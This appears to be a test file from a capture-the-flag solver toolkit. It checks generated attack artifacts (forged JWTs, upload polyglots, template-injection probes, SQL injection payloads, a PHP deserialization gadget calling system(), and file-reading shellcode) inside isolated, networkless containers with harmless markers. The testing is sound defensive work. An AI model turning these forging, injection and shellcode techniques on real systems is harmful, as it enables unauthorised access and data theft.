"""Real-library and cross-engine verification for generated offline artifacts.

The ordinary tests in this file never execute generated code and never open a
socket.  Database, template, sacrificial-interpreter, and shellcode checks are
opt-in because they require local Docker images; even then every container is
networkless, read-only, and capability-dropped.  Run them with::

    CTF_DOCKER_VERIFY=1 .venv/bin/python -m pytest \
        tests/test_round3_payload_verification.py -q
"""
from __future__ import annotations

import base64
import io
import itertools
import os
import socket
import struct
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

from ctf import triage as ctf_triage


REPO = Path(__file__).resolve().parents[1]
for folder in (
    REPO / "solvers" / "web",
    REPO / "solvers" / "toolkits",
    REPO / "solvers" / "warmups",
    REPO / "solvers" / "mobile-android",
):
    sys.path.insert(0, str(folder))

import auth_trust  # noqa: E402
import deser_gadgets  # noqa: E402
import mobile_depth  # noqa: E402
import network  # noqa: E402
import pwn_shellcode  # noqa: E402
import sqli_helper  # noqa: E402
import ssti_helper  # noqa: E402
import upload_builder  # noqa: E402
import crib_decode  # noqa: E402


DOCKER_VERIFY = os.environ.get("CTF_DOCKER_VERIFY") == "1"
DOCKER_SKIP = pytest.mark.skipif(
    not DOCKER_VERIFY,
    reason="set CTF_DOCKER_VERIFY=1 to run networkless sacrificial containers",
)
_CONTAINER_SEQUENCE = itertools.count()


def _row(rows, technique: str, variant: str) -> dict:
    return next(item for item in rows
                if item["technique"] == technique and item["variant"] == variant)


def _docker(image: str, command: list[str], *, mounts: list[tuple[Path, str, str]] = (),
            tmpfs: tuple[str, ...] = (), workdir: str | None = None,
            platform: str | None = "linux/amd64", timeout: float = 25) -> subprocess.CompletedProcess[str]:
    if not 1 <= timeout <= 90:
        raise ValueError("Docker verification timeout must be in 1..90 seconds")
    container_name = f"csctf-r3-verify-{os.getpid()}-{next(_CONTAINER_SEQUENCE)}"
    args = [
        "docker", "run", "--pull", "never", "--rm",
    ]
    if platform:
        args.extend(("--platform", platform))
    args.extend([
        "--network", "none",
        "--name", container_name, "--stop-timeout", "1",
        "--read-only", "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
        "--pids-limit", "128", "--memory", "512m",
    ])
    for source, destination, mode in mounts:
        if mode not in {"ro", "rw"}:
            raise ValueError("mount mode must be ro or rw")
        suffix = ",readonly" if mode == "ro" else ""
        args.extend(("--mount", f"type=bind,src={source},dst={destination}{suffix}"))
    for path in tmpfs:
        args.extend(("--tmpfs", path))
    if workdir is not None:
        args.extend(("--workdir", workdir))
    args.append(image)
    args.extend(command)
    try:
        return subprocess.run(args, check=False, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        # The name identifies only this helper's ephemeral container.  A qemu
        # failure must not leave a detached verifier consuming resources.
        subprocess.run(
            ["docker", "stop", "--time", "1", container_name], check=False,
            capture_output=True, text=True, timeout=5,
        )
        subprocess.run(
            ["docker", "rm", "--force", container_name], check=False,
            capture_output=True, text=True, timeout=5,
        )
        raise


def test_auth_candidates_round_trip_through_pyjwt_and_hardened_confusion_refuses():
    """Verify positive HMAC artifacts and an expected modern-library negative."""

    jwt = pytest.importorskip("jwt")
    crypto = pytest.importorskip("cryptography.hazmat.primitives.asymmetric.rsa")
    serialization = pytest.importorskip("cryptography.hazmat.primitives.serialization")

    hmac_key = "known-fixture-key-32-bytes-long!!"
    token = auth_trust.forge_jwt({"sub": "fixture", "role": "admin"}, key=hmac_key,
                                 alg="HS256", header={"kid": "fixture"})
    assert jwt.decode(token, hmac_key, algorithms=["HS256"])["role"] == "admin"

    captured = auth_trust.forge_jwt({"sub": "fixture", "role": "user"}, alg="none")
    injected = auth_trust.forge_header_key_injection(
        captured, kind="jwk", key=hmac_key, kid="embedded", role="admin",
    )
    decoded = jwt.decode(injected["token"], hmac_key, algorithms=["HS256"])
    assert decoded["role"] == "admin"
    assert jwt.get_unverified_header(injected["token"])["jwk"]["kty"] == "oct"

    private = crypto.generate_private_key(public_exponent=65537, key_size=1024)
    public_pem = private.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    header = auth_trust._b64url_encode(b'{"alg":"RS256","typ":"JWT"}')
    body = auth_trust._b64url_encode(b'{"sub":"fixture","role":"user"}')
    confusion = auth_trust.forge_rs_hs_confusion(f"{header}.{body}.AA", public_pem)
    assert auth_trust.confirm_hmac_keys(confusion["token"], [public_pem])["confirmed"]
    # PyJWT 2.x explicitly rejects asymmetric PEM bytes as an HMAC key.  The
    # generated token remains a candidate for older/vulnerable verifiers, not a
    # claim that current PyJWT is vulnerable.
    with pytest.raises(jwt.InvalidKeyError):
        jwt.decode(confusion["token"], public_pem, algorithms=["HS256"])


@pytest.mark.parametrize("format_name", ("gif", "jpeg", "png"))
def test_upload_image_polyglots_decode_with_pillow(format_name):
    image = pytest.importorskip("PIL.Image")
    marker = b"CSCTF_ROUND3_INERT_MARKER"
    blob = upload_builder.build_polyglot(format_name, marker)
    with image.open(io.BytesIO(blob)) as parsed:
        parsed.load()
        assert parsed.format.lower() == format_name
        assert parsed.size == (1, 1)
    assert marker in blob


def test_upload_pdf_polyglot_decodes_in_strict_pypdf_mode():
    pypdf = pytest.importorskip("pypdf")
    marker = b"CSCTF_ROUND3_INERT_MARKER"
    blob = upload_builder.build_polyglot("pdf", marker)
    reader = pypdf.PdfReader(io.BytesIO(blob), strict=True)
    assert len(reader.pages) == 1
    assert marker in blob


def test_benign_ssti_probe_round_trips_through_real_jinja2():
    jinja2 = pytest.importorskip("jinja2")
    probe = next(item for item in ssti_helper.fingerprint_probes()
                 if "jinja2" in item["engines"])
    rendered = jinja2.Environment(autoescape=True).from_string(probe["payload"]).render()
    assert rendered == probe["expected"]["jinja2"]
    assert ssti_helper.detect_response(rendered)[0]["engine"] == "jinja2"


@DOCKER_SKIP
def test_benign_ssti_probe_round_trips_through_real_twig(tmp_path):
    probe = next(item for item in ssti_helper.fingerprint_probes()
                 if "twig" in item["engines"])
    script = """<?php
require '/var/www/html/vendor/autoload.php';
$payload = base64_decode($argv[1], true);
if ($payload === false) { exit(2); }
$loader = new \\Twig\\Loader\\ArrayLoader(['fixture' => $payload]);
$twig = new \\Twig\\Environment($loader, ['autoescape' => false]);
echo $twig->render('fixture');
"""
    (tmp_path / "twig.php").write_text(script, encoding="utf-8")
    encoded = base64.b64encode(probe["payload"].encode()).decode("ascii")
    result = _docker(
        "phpmyadmin:latest", ["php", "/work/twig.php", encoded],
        mounts=[(tmp_path, "/work", "ro")], platform="linux/arm64",
    )
    assert result.returncode == 0, result.stderr
    assert result.stdout == probe["expected"]["twig"]
    assert ssti_helper.detect_response(result.stdout)[0]["engine"] == "twig"


def test_sqli_union_and_boolean_controls_execute_in_sqlite():
    """Exercise portable payloads in a real parser without contacting a DB."""

    import sqlite3

    connection = sqlite3.connect(":memory:")
    connection.execute("CREATE TABLE items(a INTEGER, b TEXT, c INTEGER, name TEXT, id INTEGER)")
    connection.execute("INSERT INTO items VALUES (1, 'ordinary', 3, 'held', 1)")
    rows = sqli_helper.generate_payloads(
        3, context="string", dialect="sqlite", reflected_column=2,
        marker="CSCTF_SQLI_MARKER",
    )
    union = _row(rows, "union", "reflected_marker")["payload"]
    got = connection.execute("SELECT a,b,c FROM items WHERE name='absent" + union).fetchall()
    assert got == [(None, "CSCTF_SQLI_MARKER", None)]

    numeric = sqli_helper.generate_payloads(1, context="numeric", dialect="sqlite")
    true_value = _row(numeric, "boolean", "true")["payload"]
    false_value = _row(numeric, "boolean", "false")["payload"]
    assert connection.execute("SELECT count(*) FROM items WHERE id=1" + true_value).fetchone()[0] == 1
    assert connection.execute("SELECT count(*) FROM items WHERE id=1" + false_value).fetchone()[0] == 0


@DOCKER_SKIP
def test_mysql_dialect_payloads_execute_in_networkless_mysql(tmp_path):
    """Run generated MySQL syntax in one isolated server over a Unix socket only."""

    rows = sqli_helper.generate_payloads(
        3, context="string", dialect="mysql", reflected_column=2,
        marker="CSCTF_MYSQL_MARKER",
    )
    union = _row(rows, "union", "reflected_marker")["payload"]
    numeric = sqli_helper.generate_payloads(1, context="numeric", dialect="mysql")
    true_value = _row(numeric, "boolean", "true")["payload"]
    false_value = _row(numeric, "boolean", "false")["payload"]
    setup = (
        "CREATE DATABASE fixture; USE fixture;\n"
        "CREATE TABLE items(a INT, b VARCHAR(64), c INT, name VARCHAR(64), id INT);\n"
        "INSERT INTO items VALUES (1,'ordinary',3,'held',1);\n"
    )
    (tmp_path / "setup.sql").write_text(setup, encoding="utf-8")
    # Each injection is one application-style statement.  Execute them separately: MySQL's
    # ``-- `` comment intentionally consumes the application's trailing quote/semicolon.
    (tmp_path / "union.sql").write_text(
        "SELECT a,b,c FROM fixture.items WHERE name='absent" + union + "'", encoding="utf-8",
    )
    (tmp_path / "true.sql").write_text(
        "SELECT COUNT(*) FROM fixture.items WHERE id=1" + true_value, encoding="utf-8",
    )
    (tmp_path / "false.sql").write_text(
        "SELECT COUNT(*) FROM fixture.items WHERE id=1" + false_value, encoding="utf-8",
    )
    command = r'''
set -eu
mkdir -p /tmp/mysql-data
mysqld --no-defaults --initialize-insecure --datadir=/tmp/mysql-data --user=root --log-error=/tmp/init.err
mysqld --no-defaults --datadir=/tmp/mysql-data --socket=/tmp/mysql.sock --pid-file=/tmp/mysql.pid --skip-networking --user=root --log-error=/tmp/server.err &
server=$!
trap 'kill "$server" >/dev/null 2>&1 || true; wait "$server" >/dev/null 2>&1 || true' EXIT
tries=0
until mysqladmin --no-defaults --protocol=socket --socket=/tmp/mysql.sock -uroot ping >/dev/null 2>&1; do
  tries=$((tries + 1))
  test "$tries" -lt 100 || { cat /tmp/server.err >&2; exit 1; }
  sleep 0.1
done
client='mysql --no-defaults --batch --skip-column-names --protocol=socket --socket=/tmp/mysql.sock -uroot'
$client < /work/setup.sql
$client --execute="$(cat /work/union.sql)"
$client --execute="$(cat /work/true.sql)"
$client --execute="$(cat /work/false.sql)"
'''
    result = _docker(
        "mysql:8", ["sh", "-ec", command], mounts=[(tmp_path, "/work", "ro")],
        tmpfs=("/tmp:rw,nosuid,size=384m",), platform="linux/arm64", timeout=60,
    )
    assert result.returncode == 0, result.stderr
    lines = [line.split("\t") for line in result.stdout.splitlines() if line]
    assert ["NULL", "CSCTF_MYSQL_MARKER", "NULL"] in lines
    assert lines[-2:] == [["1"], ["0"]]


@DOCKER_SKIP
def test_php_deser_candidate_runs_only_in_sacrificial_networkless_interpreter():
    source = """<?php class Worker {
      public $command;
      function __wakeup(){ system($this->command); }
    }"""
    payload = deser_gadgets.php_magic_chains(source, "printf CSCTF_DESER_MARKER")[0]["value"]
    script = (
        "class Worker { public $command; "
        "function __wakeup(){ system($this->command); } } unserialize($argv[1]);"
    )
    result = _docker("wordpress:latest", ["php", "-r", script, payload])
    assert result.returncode == 0, result.stderr
    assert result.stdout == "CSCTF_DESER_MARKER"


@DOCKER_SKIP
@pytest.mark.parametrize(
    ("arch", "compiler", "runner"),
    (
        ("amd64", "gcc -nostdlib -static -Wl,--build-id=none -o runner runner.S", "timeout 5s ./runner"),
        # The amd64 sandbox kernel executes static i386 ELFs directly.  Avoid a nested qemu-i386
        # process inside Docker Desktop's own amd64 emulation; that combination crashes before the
        # guest shellcode gets a trustworthy result on Apple silicon.
        ("i386", "as --32 runner.S -o runner.o && ld -m elf_i386 -o runner runner.o", "timeout 5s ./runner"),
        ("arm", "arm-linux-gnueabihf-gcc -O0 -static -Wl,--build-id=none -o runner runner.c", "timeout -s KILL 3s qemu-arm-static ./runner"),
        ("aarch64", "aarch64-linux-gnu-gcc -O0 -static -Wl,--build-id=none -o runner runner.c", "timeout -s KILL 3s qemu-aarch64-static ./runner"),
    ),
)
def test_orw_shellcode_executes_in_multiarch_pwn_image(tmp_path, arch, compiler, runner):
    marker = b"CSCTF_SHELLCODE_ROUND3"
    (tmp_path / "flag").write_bytes(marker)
    payload = pwn_shellcode.build_shellcode("orw", arch, path="/flag").raw
    (tmp_path / "payload.bin").write_bytes(payload)
    if arch in {"arm", "aarch64"}:
        # Execute the architecture-changing ARM trampoline and the AArch64 body from a conventional
        # anonymous RWX mapping.  This gives raw injected bytes their actual memory contract without
        # making the ELF linker infer ARM/Thumb interworking or segment properties for the payload.
        initializer = ",".join(f"0x{byte:02x}" for byte in payload)
        (tmp_path / "runner.c").write_text(
            "#include <sys/mman.h>\n#include <string.h>\n#include <stdint.h>\n"
            f"static const unsigned char code[] = {{{initializer}}};\n"
            "int main(void){void *p=mmap(0,sizeof(code),PROT_READ|PROT_WRITE|PROT_EXEC,"
            "MAP_PRIVATE|MAP_ANONYMOUS,-1,0);if(p==MAP_FAILED)return 111;"
            "memcpy(p,code,sizeof(code));__builtin___clear_cache(p,(char*)p+sizeof(code));"
            "((void(*)(void))p)();return 112;}\n",
            encoding="ascii",
        )
    else:
        (tmp_path / "runner.S").write_text(
            # The section remains writable so this same harness can also exercise
            # an explicitly requested null-free, self-terminating ORW variant.
            '.global _start\n.section .shellcode,"awx"\n_start:\n.incbin "payload.bin"\n',
            encoding="ascii",
        )
    command = (
        f"ulimit -c 0; {compiler} || exit $?; set +e; {runner} > /tmp/shellcode.out; "
        "cat /tmp/shellcode.out; test \"$(cat /tmp/shellcode.out)\" = CSCTF_SHELLCODE_ROUND3"
    )
    result = _docker(
        "csctf-pwn-multiarch:1", ["sh", "-c", command],
        mounts=[(tmp_path, "/work", "rw"), (tmp_path / "flag", "/flag", "ro")],
        tmpfs=("/tmp:rw,noexec,nosuid,size=8m",),
        workdir="/work",
    )
    assert result.returncode == 0, f"stdout={result.stdout!r}\nstderr={result.stderr}"
    assert result.stdout == marker.decode()


def _tcp_frame(src: str, dst: str, sport: int, dport: int, seq: int, ack: int,
               flags: int, payload: bytes = b"") -> bytes:
    ethernet = bytes.fromhex("0200000000020200000000010800")
    ip = struct.pack(
        "!BBHHHBBH4s4s", 0x45, 0, 40 + len(payload), 1, 0, 64, socket.IPPROTO_TCP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 8192, 0, 0)
    return ethernet + ip + tcp + payload


def _pcap(frames: list[bytes]) -> bytes:
    out = bytearray(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
    for index, frame in enumerate(frames, 1):
        out += struct.pack("<IIII", index, 0, len(frame), len(frame)) + frame
    return bytes(out)


def test_pcap_to_http_carve_to_layered_decode_integration(tmp_path):
    flag = b"CSCTF{pcap_carve_decode_round3}"
    encoded = base64.b64encode(flag)
    request = b"GET /payload.txt HTTP/1.1\r\nHost: fixture.invalid\r\n\r\n"
    response = (b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: "
                + str(len(encoded)).encode() + b"\r\n\r\n" + encoded)
    cseq, sseq = 1000, 9000
    frames = [
        _tcp_frame("10.0.0.2", "10.0.0.1", 41000, 80, cseq, 0, 0x02),
        _tcp_frame("10.0.0.1", "10.0.0.2", 80, 41000, sseq, cseq + 1, 0x12),
        _tcp_frame("10.0.0.2", "10.0.0.1", 41000, 80, cseq + 1, sseq + 1, 0x18, request),
        _tcp_frame("10.0.0.1", "10.0.0.2", 80, 41000, sseq + 1,
                   cseq + 1 + len(request), 0x18, response),
        _tcp_frame("10.0.0.1", "10.0.0.2", 80, 41000, sseq + 1 + len(response),
                   cseq + 1 + len(request), 0x11),
        _tcp_frame("10.0.0.2", "10.0.0.1", 41000, 80, cseq + 1 + len(request),
                   sseq + 2 + len(response), 0x11),
    ]
    capture = _pcap(frames)
    artifact = tmp_path / "fixture.pcap"
    artifact.write_bytes(capture)
    route = ctf_triage.suggest(
        "forensics", "A saved pcap contains an encoded HTTP response", tmp_path,
    )
    assert "solvers/toolkits/network.py" in route["engines"]
    assert route["files"] and route["files"][0][0] == "fixture.pcap"

    objects = network.read(capture, "fixture.pcap").objects()
    assert len(objects) == 1 and objects[0].complete is True
    assert objects[0].name == "payload.txt" and objects[0].data == encoded
    solved = crib_decode.solve_blob(objects[0].data, budget=1.0, retry=0)
    assert solved is not None and solved[0] == flag.decode()
    assert "b64" in solved[1][0]


def test_apk_bundle_inventory_to_layered_decode_integration(tmp_path):
    flag = b"CSCTF{apk_bundle_decode_round3}"
    encoded = base64.b64encode(flag)
    stream = io.BytesIO()
    with zipfile.ZipFile(stream, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "assets/index.android.bundle",
            b"const secret='" + encoded + b"'; const client_id='offline-fixture';",
        )
    apk = stream.getvalue()
    artifact = tmp_path / "fixture.apk"
    artifact.write_bytes(apk)
    route = ctf_triage.suggest(
        "mobile", "Flutter React-Native bundle with an exported deep link", tmp_path,
    )
    assert route["engines"][0] == "solvers/mobile-android/mobile_depth.py"
    assert route["files"] and route["files"][0][0] == "fixture.apk"

    inventory = mobile_depth.extract_crossplatform(apk)
    lead = next(item["value"] for item in inventory["candidates"] if "secret=" in item["value"])
    encoded_lead = lead.split("secret='", 1)[1].split("'", 1)[0].encode()
    solved = crib_decode.solve_blob(encoded_lead, budget=1.0, retry=0)
    assert solved is not None and solved[0] == flag.decode()

